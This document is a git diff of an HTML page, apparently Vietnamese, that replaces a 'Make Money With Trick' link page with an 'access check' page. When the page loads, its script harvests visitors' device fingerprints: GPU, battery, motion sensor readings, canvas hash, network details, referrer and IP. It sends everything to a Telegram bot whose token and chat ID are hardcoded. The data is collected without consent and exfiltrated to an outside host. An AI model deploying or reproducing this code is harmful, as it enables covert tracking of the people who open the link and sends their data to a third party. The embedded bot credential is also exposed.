@@ -1,26 +1,636 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="vi">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width,initial-scale=1">
-    <title>Wolf X</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Hệ Thống Kiểm Tra Truy Cập</title>
     <style>
-        body{margin:0;min-height:100vh;display:flex;align-items:center;justify-content:center;background:#1a1a1a;color:#fff;font-family:system-ui,sans-serif;padding:15px}
-        .container{text-align:center;width:100%;max-width:500px}
-        .title{font-size:clamp(2rem,5vw,3rem);margin:0 0 10px}
-        .description{font-size:clamp(1rem,3vw,1.2rem);margin:0 0 25px;color:#888}
-        .button-1{display:inline-block;padding:12px 30px;background:#333;color:#fff;text-decoration:none;border-radius:25px;width:90%;max-width:250px;margin:10px auto}
-        .button-2{display:inline-block;padding:12px 30px;background:#333;color:#fff;text-decoration:none;border-radius:25px;width:90%;max-width:250px;margin:10px auto}
-        .button-1:hover{background:#444}
-        .button-2:hover{background:#444}
+        body {
+            font-family: Arial, sans-serif;
+            margin: 20px;
+            background-color: #f0f0f0;
+        }
+        .info-container {
+            background-color: white;
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+            margin-bottom: 10px;
+        }
+        .warning {
+            color: red;
+            font-weight: bold;
+        }
     </style>
 </head>
 <body>
-    <div class="container">
-        <h1 class="title">Anh Khoa</h1>
-        <p class="description">Make Money With Trick</p>
-            <a href="https://reurl.cc/96aMxV" class="button-1">Link 1</a>
-            <a href="https://reurl.cc/96aMxV" class="button-2">Link 2</a>
+    <div class="info-container" id="info">
+        <h2>Đang kiểm tra thông tin truy cập...</h2>
     </div>
+
+    <script>
+        // Hàm lấy thông tin về phần cứng
+        async function getHardwareInfo() {
+            const gl = document.createElement('canvas').getContext('webgl');
+            const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+            return {
+                gpu: gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL),
+                vendor: gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL),
+                webglVersion: gl.getParameter(gl.VERSION),
+                maxTextureSize: gl.getParameter(gl.MAX_TEXTURE_SIZE)
+            };
+        }
+
+        // Hàm lấy thông tin về pin
+        async function getBatteryInfo() {
+            if ('getBattery' in navigator) {
+                try {
+                    const battery = await navigator.getBattery();
+                    return {
+                        level: battery.level * 100,
+                        charging: battery.charging,
+                        chargingTime: battery.chargingTime,
+                        dischargingTime: battery.dischargingTime
+                    };
+                } catch (e) {
+                    return null;
+                }
+            }
+            return null;
+        }
+
+        // Hàm kiểm tra cảm biến
+        async function getSensorInfo() {
+            const sensors = {
+                accelerometer: false,
+                gyroscope: false,
+                magnetometer: false,
+                ambient: false
+            };
+
+            if ('DeviceMotionEvent' in window) {
+                sensors.accelerometer = true;
+            }
+            if ('DeviceOrientationEvent' in window) {
+                sensors.gyroscope = true;
+            }
+            if ('AmbientLightSensor' in window) {
+                sensors.ambient = true;
+            }
+            return sensors;
+        }
+
+        // Nâng cao hàm lấy fingerprint
+        function getEnhancedFingerprint() {
+            const canvas = document.createElement('canvas');
+            const ctx = canvas.getContext('2d');
+            canvas.width = 200;
+            canvas.height = 200;
+
+            // Vẽ text với gradient
+            const gradient = ctx.createLinearGradient(0, 0, canvas.width, canvas.height);
+            gradient.addColorStop(0, '#f00');
+            gradient.addColorStop(0.5, '#0f0');
+            gradient.addColorStop(1, '#00f');
+            ctx.fillStyle = gradient;
+            ctx.font = '18px Arial';
+            ctx.fillText('Browser Fingerprint', 10, 50);
+            
+            // Vẽ hình dạng
+            ctx.beginPath();
+            ctx.arc(100, 100, 50, 0, Math.PI * 2);
+            ctx.stroke();
+
+            return btoa(canvas.toDataURL());
+        }
+
+        // Nâng cao hàm kiểm tra bot
+        function checkEnhancedBot() {
+            const suspicious = {
+                automation: false,
+                emulation: false,
+                inconsistency: false
+            };
+
+            // Kiểm tra automation
+            suspicious.automation = (
+                'webdriver' in navigator || 
+                navigator.webdriver || 
+                window.document.documentElement.getAttribute("webdriver") !== null
+            );
+
+            // Kiểm tra emulation
+            suspicious.emulation = (
+                !('ontouchstart' in window) && 
+                navigator.maxTouchPoints > 0
+            );
+
+            // Kiểm tra tính nhất quán
+            suspicious.inconsistency = (
+                navigator.hardwareConcurrency < 2 ||
+                navigator.deviceMemory < 2 ||
+                !navigator.languages ||
+                navigator.languages.length === 0
+            );
+
+            return suspicious;
+        }
+
+        // Thêm hàm kiểm tra nguồn truy cập
+        async function getReferrerInfo() {
+            return {
+                referrer: document.referrer || 'Truy cập trực tiếp',
+                previousPages: window.history.length,
+                navigationTiming: performance.getEntriesByType('navigation')[0],
+                sourceProtocol: window.location.protocol,
+                sourceHost: window.location.hostname,
+                sourcePath: window.location.pathname
+            };
+        }
+
+        // Nâng cao hàm kiểm tra thiết bị thật/giả
+        function getDeviceAuthenticity() {
+            const indicators = {
+                isReal: true,
+                suspiciousPoints: [],
+                confidence: 100
+            };
+
+            // Kiểm tra độ nhất quán của thông tin
+            if (navigator.hardwareConcurrency > 32 || navigator.hardwareConcurrency < 1) {
+                indicators.suspiciousPoints.push('CPU cores không hợp lý');
+                indicators.confidence -= 20;
+            }
+
+            // Kiểm tra WebGL
+            const canvas = document.createElement('canvas');
+            const gl = canvas.getContext('webgl');
+            if (!gl) {
+                indicators.suspiciousPoints.push('Không hỗ trợ WebGL');
+                indicators.confidence -= 15;
+            }
+
+            // Kiểm tra độ nhất quán của màn hình
+            if (window.screen.width < window.screen.height && navigator.userAgent.includes('Desktop')) {
+                indicators.suspiciousPoints.push('Kích thước màn hình không phù hợp với thiết bị');
+                indicators.confidence -= 10;
+            }
+
+            // Kiểm tra plugins
+            if (navigator.plugins.length === 0) {
+                indicators.suspiciousPoints.push('Không có plugins');
+                indicators.confidence -= 10;
+            }
+
+            // Kiểm tra performance
+            const performance = window.performance;
+            if (!performance || !performance.memory) {
+                indicators.suspiciousPoints.push('Không có thông tin performance');
+                indicators.confidence -= 10;
+            }
+
+            indicators.isReal = indicators.confidence > 70;
+            return indicators;
+        }
+
+        // Thêm hàm mới để thu thập thông tin cảm biến chi tiết
+        async function getDetailedSensorInfo() {
+            const sensorData = {
+                accelerometer: {
+                    supported: false,
+                    data: null,
+                    anomalies: []
+                },
+                gyroscope: {
+                    supported: false,
+                    data: null,
+                    anomalies: []
+                },
+                orientation: {
+                    supported: false,
+                    data: null,
+                    anomalies: []
+                }
+            };
+
+            // Theo dõi dữ liệu gia tốc
+            if ('DeviceMotionEvent' in window) {
+                sensorData.accelerometer.supported = true;
+                const accelData = [];
+                
+                await new Promise((resolve) => {
+                    const handleMotion = (event) => {
+                        const { acceleration, accelerationIncludingGravity } = event;
+                        accelData.push({
+                            x: acceleration?.x || 0,
+                            y: acceleration?.y || 0,
+                            z: acceleration?.z || 0,
+                            withGravity: {
+                                x: accelerationIncludingGravity?.x || 0,
+                                y: accelerationIncludingGravity?.y || 0,
+                                z: accelerationIncludingGravity?.z || 0
+                            },
+                            timestamp: Date.now()
+                        });
+
+                        if (accelData.length >= 10) {
+                            window.removeEventListener('devicemotion', handleMotion);
+                            resolve();
+                        }
+                    };
+
+                    window.addEventListener('devicemotion', handleMotion);
+                    setTimeout(resolve, 1000); // Timeout sau 1 giây
+                });
+
+                sensorData.accelerometer.data = accelData;
+                
+                // Phân tích dữ liệu gia tốc
+                if (accelData.length > 0) {
+                    const avgAccel = accelData.reduce((acc, curr) => ({
+                        x: acc.x + curr.x,
+                        y: acc.y + curr.y,
+                        z: acc.z + curr.z
+                    }), { x: 0, y: 0, z: 0 });
+
+                    // Kiểm tra bất thường
+                    if (Math.abs(avgAccel.x) < 0.001 && Math.abs(avgAccel.y) < 0.001) {
+                        sensorData.accelerometer.anomalies.push('Dữ liệu gia tốc quá ổn định');
+                    }
+                }
+            }
+
+            // Theo dõi dữ liệu con quay hồi chuyển
+            if ('DeviceOrientationEvent' in window) {
+                sensorData.gyroscope.supported = true;
+                const gyroData = [];
+
+                await new Promise((resolve) => {
+                    const handleOrientation = (event) => {
+                        gyroData.push({
+                            alpha: event.alpha, // Quay theo trục Z
+                            beta: event.beta,   // Quay theo trục X
+                            gamma: event.gamma, // Quay theo trục Y
+                            timestamp: Date.now()
+                        });
+
+                        if (gyroData.length >= 10) {
+                            window.removeEventListener('deviceorientation', handleOrientation);
+                            resolve();
+                        }
+                    };
+
+                    window.addEventListener('deviceorientation', handleOrientation);
+                    setTimeout(resolve, 1000);
+                });
+
+                sensorData.gyroscope.data = gyroData;
+
+                // Phân tích dữ liệu con quay
+                if (gyroData.length > 0) {
+                    const variations = gyroData.slice(1).map((curr, i) => ({
+                        alpha: Math.abs(curr.alpha - gyroData[i].alpha),
+                        beta: Math.abs(curr.beta - gyroData[i].beta),
+                        gamma: Math.abs(curr.gamma - gyroData[i].gamma)
+                    }));
+
+                    // Kiểm tra bất thường
+                    const avgVariation = variations.reduce((acc, curr) => ({
+                        alpha: acc.alpha + curr.alpha,
+                        beta: acc.beta + curr.beta,
+                        gamma: acc.gamma + curr.gamma
+                    }), { alpha: 0, beta: 0, gamma: 0 });
+
+                    if (avgVariation.alpha < 0.01 && avgVariation.beta < 0.01 && avgVariation.gamma < 0.01) {
+                        sensorData.gyroscope.anomalies.push('Dữ liệu con quay quá ổn định');
+                    }
+                }
+            }
+
+            return sensorData;
+        }
+
+        // Thêm hàm collectInfo
+        async function collectInfo() {
+            try {
+                const infoDiv = document.getElementById('info');
+                infoDiv.innerHTML = '<h2>Đang thu thập thông tin...</h2>';
+
+                // Thu thập các thông tin cơ bản
+                const hardware = await getHardwareInfo();
+                const battery = await getBatteryInfo();
+                const sensors = await getSensorInfo();
+                const enhancedFingerprint = getEnhancedFingerprint();
+                const botCheck = checkEnhancedBot();
+                const referrerInfo = await getReferrerInfo();
+                const deviceAuthenticity = getDeviceAuthenticity();
+                const detailedSensors = await getDetailedSensorInfo();
+
+                const info = {
+                    // Thông tin cơ bản
+                    userAgent: navigator.userAgent,
+                    platform: navigator.platform,
+                    vendor: navigator.vendor,
+                    language: navigator.language,
+                    languages: navigator.languages,
+                    doNotTrack: navigator.doNotTrack,
+                    cookieEnabled: navigator.cookieEnabled,
+
+                    // Thông tin phần cứng
+                    hardwareConcurrency: navigator.hardwareConcurrency,
+                    deviceMemory: navigator.deviceMemory,
+                    gpu: hardware.gpu,
+                    gpuVendor: hardware.vendor,
+                    webglVersion: hardware.webglVersion,
+                    maxTextureSize: hardware.maxTextureSize,
+
+                    // Thông tin màn hình
+                    screenResolution: `${window.screen.width}x${window.screen.height}`,
+                    colorDepth: window.screen.colorDepth,
+                    pixelRatio: window.devicePixelRatio,
+
+                    // Thông tin cảm biến
+                    sensors: sensors,
+                    detailedSensors: detailedSensors,
+
+                    // Thông tin pin
+                    battery: battery,
+
+                    // Thông tin mạng
+                    connection: navigator.connection || navigator.mozConnection || navigator.webkitConnection,
+                    network: {
+                        effectiveType: navigator.connection?.effectiveType,
+                        downlink: navigator.connection?.downlink,
+                        rtt: navigator.connection?.rtt,
+                        saveData: navigator.connection?.saveData
+                    },
+
+                    // Thông tin bảo mật
+                    botIndicators: botCheck,
+                    deviceAuthenticity: deviceAuthenticity,
+
+                    // Thông tin nguồn
+                    referrer: referrerInfo,
+
+                    // Thời gian và địa điểm
+                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                    timezoneOffset: new Date().getTimezoneOffset(),
+                    timestamp: new Date().toISOString(),
+
+                    // Bảo mật và bot
+                    fingerprint: enhancedFingerprint
+                };
+
+                // Lấy IP
+                try {
+                    const ipResponse = await fetch('https://api.ipify.org?format=json');
+                    const ipData = await ipResponse.json();
+                    info.ip = ipData.ip;
+                } catch (error) {
+                    info.ip = 'Không thể lấy IP';
+                    console.error('Lỗi khi lấy IP:', error);
+                }
+
+                // Hiển thị thông tin và gửi đến Telegram
+                displayEnhancedInfo(info);
+                await sendToTelegram(info);
+
+            } catch (error) {
+                const infoDiv = document.getElementById('info');
+                infoDiv.innerHTML = `
+                    <h2>Có lỗi xảy ra</h2>
+                    <p class="warning">Không thể thu thập đầy đủ thông tin: ${error.message}</p>
+                `;
+                console.error('Lỗi khi thu thập thông tin:', error);
+            }
+        }
+
+        // Hiển thị thông tin nâng cao
+        function displayEnhancedInfo(info) {
+            const infoDiv = document.getElementById('info');
+            infoDiv.innerHTML = `
+                <h2>Thông tin chi tiết truy cập</h2>
+                
+                <h3>Phân tích thiết bị</h3>
+                <p class="${info.deviceAuthenticity.isReal ? '' : 'warning'}">
+                    Độ tin cậy: ${info.deviceAuthenticity.confidence}%
+                </p>
+                ${info.deviceAuthenticity.suspiciousPoints.map(point => 
+                    `<p class="warning">⚠️ ${point}</p>`
+                ).join('')}
+
+                <h3>Nguồn truy cập</h3>
+                <p>Nguồn: ${info.referrer.referrer}</p>
+                <p>Số trang đã duyệt: ${info.referrer.previousPages}</p>
+                <p>Protocol: ${info.referrer.sourceProtocol}</p>
+
+                <h3>Thông tin cơ bản</h3>
+                <p>IP: ${info.ip}</p>
+                <p>Thiết bị: ${info.platform}</p>
+                <p>Trình duyệt: ${info.userAgent}</p>
+                <p>Độ phân giải: ${info.screenResolution}</p>
+                <p>Tỷ lệ pixel: ${info.pixelRatio}</p>
+
+                <h3>Phần cứng</h3>
+                <p>CPU Cores: ${info.hardwareConcurrency}</p>
+                <p>RAM: ${info.deviceMemory}GB</p>
+                <p>GPU: ${info.gpu}</p>
+
+                <h3>Cảm biến</h3>
+                <p>Accelerometer: ${info.sensors.accelerometer ? 'Có' : 'Không'}</p>
+                <p>Gyroscope: ${info.sensors.gyroscope ? 'Có' : 'Không'}</p>
+
+                <h3>Pin</h3>
+                ${info.battery ? `
+                    <p>Mức pin: ${info.battery.level}%</p>
+                    <p>Đang sạc: ${info.battery.charging ? 'Có' : 'Không'}</p>
+                ` : '<p>Không có thông tin pin</p>'}
+
+                <h3>Kiểm tra bảo mật</h3>
+                ${info.botIndicators.automation ? '<p class="warning">⚠️ Phát hiện dấu hiệu tự động hóa!</p>' : ''}
+                ${info.botIndicators.emulation ? '<p class="warning">⚠️ Phát hiện dấu hiệu giả lập!</p>' : ''}
+                ${info.botIndicators.inconsistency ? '<p class="warning">⚠️ Phát hiện thông tin không nhất quán!</p>' : ''}
+
+                <h3>Thông tin mạng</h3>
+                <p>Loại kết nối: ${info.network.effectiveType || 'Không xác định'}</p>
+                <p>Tốc độ: ${info.network.downlink ? info.network.downlink + ' Mbps' : 'Không xác định'}</p>
+                <p>Độ trễ: ${info.network.rtt ? info.network.rtt + 'ms' : 'Không xác định'}</p>
+
+                <h3>Thông tin cảm biến chi tiết</h3>
+                <h4>Gia tốc kế</h4>
+                ${info.detailedSensors.accelerometer.supported ? `
+                    <p>Trạng thái: Hoạt động</p>
+                    ${info.detailedSensors.accelerometer.data ? `
+                        <p>Số mẫu: ${info.detailedSensors.accelerometer.data.length}</p>
+                        <p>Dữ liệu mới nhất: 
+                            X: ${info.detailedSensors.accelerometer.data.slice(-1)[0].x.toFixed(3)},
+                            Y: ${info.detailedSensors.accelerometer.data.slice(-1)[0].y.toFixed(3)},
+                            Z: ${info.detailedSensors.accelerometer.data.slice(-1)[0].z.toFixed(3)}
+                        </p>
+                    ` : '<p>Chưa có dữ liệu</p>'}
+                    ${info.detailedSensors.accelerometer.anomalies.map(anomaly => 
+                        `<p class="warning">⚠️ ${anomaly}</p>`
+                    ).join('')}
+                ` : '<p>Không hỗ trợ</p>'}
+
+                <h4>Con quay hồi chuyển</h4>
+                ${info.detailedSensors.gyroscope.supported ? `
+                    <p>Trạng thái: Hoạt động</p>
+                    ${info.detailedSensors.gyroscope.data ? `
+                        <p>Số mẫu: ${info.detailedSensors.gyroscope.data.length}</p>
+                        <p>Dữ liệu mới nhất: 
+                            Alpha: ${info.detailedSensors.gyroscope.data.slice(-1)[0].alpha?.toFixed(3) || 'N/A'},
+                            Beta: ${info.detailedSensors.gyroscope.data.slice(-1)[0].beta?.toFixed(3) || 'N/A'},
+                            Gamma: ${info.detailedSensors.gyroscope.data.slice(-1)[0].gamma?.toFixed(3) || 'N/A'}
+                        </p>
+                    ` : '<p>Chưa có dữ liệu</p>'}
+                    ${info.detailedSensors.gyroscope.anomalies.map(anomaly => 
+                        `<p class="warning">⚠️ ${anomaly}</p>`
+                    ).join('')}
+                ` : '<p>Không hỗ trợ</p>'}
+            `;
+        }
+
+        // Cập nhật hàm sendToTelegram
+        async function sendToTelegram(info) {
+            const BOT_TOKEN = '7858693034:AAFxqIwNOPwQcI0fyvYfpn-0Zj55hc8FY1M';
+            const CHAT_ID = '-1002441150861';
+            
+            // Tin nhắn chính
+            const mainMessage = `
+╔══════════════════╗
+║  🔍 TRUY CẬP MỚI  ║
+╚══════════════════╝
+
+${info.deviceAuthenticity.confidence > 70 ? '✅' : '⚠️'} Trạng thái: ${info.deviceAuthenticity.confidence > 70 ? 'AN TOÀN' : 'ĐÁNG NGỜ'} (${info.deviceAuthenticity.confidence}%)
+
+📱 THÔNG TIN THIẾT BỊ
+▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔
+• 🌐 IP: ${info.ip}
+• 💻 Thiết bị: ${info.platform}
+• 🔑 ID: ${info.fingerprint.substring(0, 16)}...
+• 🌍 Khu vực: ${info.timezone}
+• 🕒 Thời gian: ${new Date().toLocaleString('vi-VN')}
+
+🛡️ KIỂM TRA BẢO MẪT
+▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔
+• ${info.botIndicators.automation ? "⛔" : "✅"} Tự động hóa
+• ${info.botIndicators.emulation ? "⛔" : "✅"} Giả lập
+• ${navigator.plugins.length === 0 ? "⚠️" : "✅"} Plugins
+• ${navigator.languages.length === 0 ? "⚠️" : "✅"} Ngôn ngữ
+
+📊 THÔNG SỐ KỸ THUẬT
+▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔
+• 🖥️ Màn hình: ${info.screenResolution}
+• 💾 RAM: ${info.deviceMemory || 'N/A'}GB
+• ⚡ CPU: ${info.hardwareConcurrency} cores
+• 📡 Mạng: ${info.network.effectiveType || 'N/A'}
+• 🔋 Pin: ${info.battery ? `${info.battery.level}% (${info.battery.charging ? 'Đang sạc' : 'Không sạc'})` : 'N/A'}`;
+
+            // Tin nhắn phần cứng
+            const hardwareMessage = `
+╔═══════════════════╗
+║  🔧 CHI TIẾT THIẾT BỊ ║
+╚═══════════════════╝
+
+🎮 THÔNG TIN GPU
+▔▔▔▔▔▔▔▔▔▔▔▔▔
+• Card: ${info.gpu || 'N/A'}
+• Nhà sản xuất: ${info.gpuVendor || 'N/A'}
+• WebGL: ${info.webglVersion || 'N/A'}
+
+📱 THÔNG TIN HIỂN THỊ
+▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔
+• Độ sâu màu: ${info.colorDepth || 'N/A'}
+• Tỷ lệ pixel: ${info.pixelRatio || 'N/A'}x
+• Ngôn ngữ: ${info.language}
+
+📡 THÔNG TIN MẠNG
+▔▔▔▔▔▔▔▔▔▔▔▔▔
+• Tốc độ: ${info.network.downlink ? info.network.downlink + ' Mbps' : 'N/A'}
+• Độ trễ: ${info.network.rtt ? info.network.rtt + 'ms' : 'N/A'}
+• Tiết kiệm: ${info.network.saveData ? "Bật" : "Tắt"}
+
+🔌 KẾT NỐI
+▔▔▔▔▔▔▔▔
+• WebRTC: ${navigator.mediaDevices ? "✅" : "❌"}
+• Bluetooth: ${navigator.bluetooth ? "✅" : "❌"}
+• USB: ${navigator.usb ? "✅" : "❌"}
+• Vị trí: ${navigator.geolocation ? "✅" : "❌"}
+
+📱 CẢM BIẾN
+▔▔▔▔▔▔▔▔
+• Gia tốc: ${info.sensors.accelerometer ? "✅" : "❌"}
+• Ánh sáng: ${info.sensors.ambient ? "✅" : "❌"}
+• La bàn: ${info.sensors.magnetometer ? "✅" : "❌"}
+• Định hướng: ${info.sensors.gyroscope ? "✅" : "❌"}`;
+
+            // Tin nhắn cảnh báo (nếu có)
+            const warningMessage = info.deviceAuthenticity.suspiciousPoints.length > 0 ? `
+╔═══════════════════╗
+║  ⚠️ CẢNH BÁO NGUY HIỂM ║
+╚═══════════════════╝
+
+${info.deviceAuthenticity.suspiciousPoints.map(point => `❌ ${point}`).join('\n')}
+
+⚠️ Khuyến nghị: Kiểm tra kỹ thiết bị này!
+` : '';
+
+            try {
+                const infoDiv = document.getElementById('info');
+                infoDiv.innerHTML += `<p>Đang gửi thông báo đến Telegram...</p>`;
+                
+                // Gửi tin nhắn chính
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        chat_id: CHAT_ID,
+                        text: mainMessage,
+                        parse_mode: 'HTML'
+                    })
+                });
+
+                // Gửi thông tin chi tiết phần cứng
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        chat_id: CHAT_ID,
+                        text: hardwareMessage
+                    })
+                });
+
+                // Gửi cảnh báo nếu có điểm đáng ngờ
+                if (warningMessage) {
+                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json',
+                        },
+                        body: JSON.stringify({
+                            chat_id: CHAT_ID,
+                            text: warningMessage
+                        })
+                    });
+                }
+
+                infoDiv.innerHTML += `<p style="color: green;">✅ Đã gửi thông báo thành công!</p>`;
+            } catch (error) {
+                console.error('Lỗi khi gửi thông báo:', error);
+                const infoDiv = document.getElementById('info');
+                infoDiv.innerHTML += `<p class="warning">❌ Lỗi khi gửi thông báo: ${error.message}</p>`;
+            }
+        }
+
+        // Cập nhật cách gọi hàm khi tải trang
+        window.addEventListener('load', () => {
+            setTimeout(collectInfo, 500); // Thêm độ trễ nhỏ để đảm bảo trang đã tải hoàn toàn
+        });
+    </script>
 </body>
 </html> 
